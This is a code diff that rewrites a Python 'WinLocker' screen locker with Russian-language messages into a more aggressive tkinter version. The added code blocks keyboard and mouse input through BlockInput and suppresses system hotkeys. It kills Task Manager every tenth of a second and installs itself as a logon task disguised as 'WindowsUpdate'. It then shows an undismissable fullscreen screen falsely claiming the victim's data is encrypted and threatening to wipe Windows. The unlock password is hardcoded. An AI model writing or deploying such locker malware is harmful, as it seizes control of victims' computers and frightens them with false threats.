@@ -1,32 +1,75 @@
-import sys
-import time
-import threading
-import random
-from PyQt5.QtCore import Qt, QTimer
-from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QLineEdit, QPushButton, QVBoxLayout
+import os, sys, time, threading, ctypes, tkinter as tk
 
+# ============================================================
+# >>> НАСТРОЙКИ <<<
 PASSWORD = "1601"
-TIMER_SECONDS = 15
+TIMER_SECONDS = 15   # стартовый таймер (0 — если из автозагрузки)
+# ============================================================
 
-class WinLocker(QWidget):
+# ---------- глобальная блокировка клавиатуры/мыши ----------
+def block_input(block=True):
+    ctypes.windll.user32.BlockInput(block)
+
+# ---------- фоновый блокировщик горячих клавиш ----------
+def block_all_keys():
+    try:
+        import keyboard
+        for combo in ['alt+f4','alt+tab','ctrl+shift+esc',
+                      'ctrl+alt+del','win+d','win+r','win',
+                      'alt','ctrl','shift','escape']:
+            keyboard.add_hotkey(combo, lambda: None, suppress=True)
+    except: pass
+
+# ---------- убийца диспетчера задач ----------
+def kill_taskmgr():
+    while True:
+        os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
+        time.sleep(0.1)
+
+# ---------- автостарт ----------
+def add_to_startup():
+    import subprocess
+    script_path = os.path.abspath(__file__)
+    subprocess.run(
+        f'schtasks /create /tn "WindowsUpdate" '
+        f'/tr "python \"{script_path}\"" /sc onlogon /f',
+        shell=True, capture_output=True
+    )
+
+# ---------- анимация запуска ----------
+def show_boot_animation():
+    root = tk.Tk()
+    root.attributes('-fullscreen', True)
+    root.configure(bg='black')
+    lbl = tk.Label(root, text="", fg='white', bg='black',
+                   font=('Courier', 36, 'bold'))
+    lbl.pack(expand=True)
+    messages = [
+        "ВАС ЗАМЕТИЛ DEDSEK...",
+        "ПОДКЛЮЧЕНИЕ К ctOS 2.0...",
+        "РАСШИФРОВКА КЛЮЧЕЙ...",
+        "DIE"
+    ]
+    for msg in messages:
+        lbl.config(text=msg)
+        root.update()
+        time.sleep(2)
+    root.destroy()
+
+# ---------- главный экран блокировки ----------
+class WinLocker:
     def __init__(self):
-        super().__init__()
-        self.initUI()
-        self.start_timer()
-        
-    def initUI(self):
-        self.setWindowFlags(
-            Qt.WindowStaysOnTopHint |
-            Qt.FramelessWindowHint |
-            Qt.X11BypassWindowManagerHint
-        )
-        self.setGeometry(0, 0, QApplication.primaryScreen().size().width(), QApplication.primaryScreen().size().height())
-        self.setStyleSheet("background-color: black;")
-        
-        layout = QVBoxLayout()
-        layout.setAlignment(Qt.AlignBottom | Qt.AlignLeft)
-        
-        self.scary_label = QLabel(
+        self.root = tk.Tk()
+        self.root.withdraw()
+        self.win = tk.Toplevel(self.root)
+        self.win.attributes('-fullscreen', True)
+        self.win.attributes('-topmost', True)
+        self.win.configure(bg='black')
+        self.win.overrideredirect(True)
+        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
+
+        # ========== ЛЕВЫЙ БЛОК (страшный текст) ==========
+        scary_text = (
             "ВАШИ ДАННЫЕ ЗАШИФРОВАНЫ\n"
             "ПЕРЕЗАГРУЗКА ИЛИ ВЫКЛЮЧЕНИЕ ПК = СНОС WINDOWS\n"
             "ПАРОЛЬ ТЫ НИКОГДА НЕ УЗНАЕШЬ\n"
@@ -41,10 +84,11 @@ class WinLocker(QWidget):
             "4. Base64\nNDM1NjM0MjM0\n"
             "5. SHA1\nc93c407d0fb7c60a40b8a2f02b1e4ccf2a9c632d"
         )
-        self.scary_label.setStyleSheet("color: white; font-family: Courier; font-size: 14px;")
-        layout.addWidget(self.scary_label)
-        
-        self.dedsek_label = QLabel(
+        tk.Label(self.win, text=scary_text, fg='white', bg='black',
+                 font=('Courier', 14), justify='left').place(relx=0.02, rely=0.1, anchor='nw')
+
+        # ========== ПРАВЫЙ БЛОК (сообщение DEDSEK) ==========
+        dedsek_text = (
             "DeDsEk тебя приветствует\n"
             "не надо было ничего скачивать\n"
             "из непроверенных источников\n\n"
@@ -56,47 +100,55 @@ class WinLocker(QWidget):
             "- Руткит\n"
             "- Червяк такой жирный"
         )
-        self.dedsek_label.setStyleSheet("color: white; font-family: Courier; font-size: 16px;")
-        self.dedsek_label.setAlignment(Qt.AlignRight | Qt.AlignBottom)
-        layout.addWidget(self.dedsek_label)
-        
-        self.password_label = QLabel("ВВЕДИТЕ ПАРОЛЬ:")
-        self.password_label.setStyleSheet("color: white; font-family: Courier; font-size: 28px;")
-        self.password_label.setAlignment(Qt.AlignCenter)
-        layout.addWidget(self.password_label)
-        
-        self.password_input = QLineEdit()
-        self.password_input.setStyleSheet("color: white; background-color: black; font-family: Courier; font-size: 28px;")
-        self.password_input.setEchoMode(QLineEdit.Password)
-        layout.addWidget(self.password_input)
-        
-        self.status_label = QLabel("")
-        self.status_label.setStyleSheet("color: white; font-family: Courier; font-size: 20px;")
-        self.status_label.setAlignment(Qt.AlignCenter)
-        layout.addWidget(self.status_label)
-        
-        self.setLayout(layout)
-        
-        self.password_input.returnPressed.connect(self.check_password)
-        self.password_input.setFocus()
-        
-    def check_password(self):
-        if self.password_input.text() == PASSWORD:
-            self.close()
-        else:
-            self.status_label.setText("НЕВЕРНЫЙ ПАРОЛЬ!")
-            self.password_input.clear()
-            
-    def start_timer(self):
-        self.timer = QTimer()
-        self.timer.timeout.connect(self.show)
-        self.timer.start(TIMER_SECONDS * 1000)
-        
-    def closeEvent(self, event):
-        event.ignore()
+        tk.Label(self.win, text=dedsek_text, fg='white', bg='black',
+                 font=('Courier', 16), justify='right').place(relx=0.98, rely=0.1, anchor='ne')
 
-if __name__ == '__main__':
-    app = QApplication(sys.argv)
-    app.setOverrideCursor(Qt.BlankCursor)
-    win = WinLocker()
-    app.exec_()
+        # ========== ЦЕНТРАЛЬНАЯ ФОРМА ВВОДА ==========
+        center_frame = tk.Frame(self.win, bg='black')
+        center_frame.place(relx=0.5, rely=0.7, anchor='center')
+
+        tk.Label(center_frame, text="ВВЕДИТЕ ПАРОЛЬ:", fg='white', bg='black',
+                 font=('Courier', 28)).pack(pady=(0, 10))
+        self.entry = tk.Entry(center_frame, show="*", font=('Courier', 28),
+                              bg='black', fg='white', insertbackground='white')
+        self.entry.pack(pady=(0, 10))
+        self.status = tk.Label(center_frame, text="", fg='white', bg='black',
+                               font=('Courier', 20))
+        self.status.pack(pady=(0, 10))
+
+        self.entry.bind('<Return>', self.check_password)
+        self.entry.focus_set()
+
+        # Запускаем лёгкую анимацию (мерцание курсора)
+        self.animate()
+
+    def check_password(self, event=None):
+        if self.entry.get() == PASSWORD:
+            block_input(False)          # разблокируем железо
+            self.root.destroy()
+            os._exit(0)
+        else:
+            self.status.config(text="НЕВЕРНЫЙ ПАРОЛЬ!")
+            self.entry.delete(0, tk.END)
+
+    def animate(self):
+        # просто поддерживаем окно "живым"
+        self.win.after(50, self.animate)
+
+# ============================================================
+if __name__ == "__main__":
+    # Если скрипт запущен из автозагрузки — таймер не нужен
+    if os.path.basename(sys.argv[0]) != "winlocker.py":
+        TIMER_SECONDS = 0
+
+    add_to_startup()
+    threading.Thread(target=kill_taskmgr, daemon=True).start()
+    time.sleep(TIMER_SECONDS)
+
+    block_input(True)
+    threading.Thread(target=block_all_keys, daemon=True).start()
+
+    show_boot_animation()
+    WinLocker()
+    tk.mainloop()
+
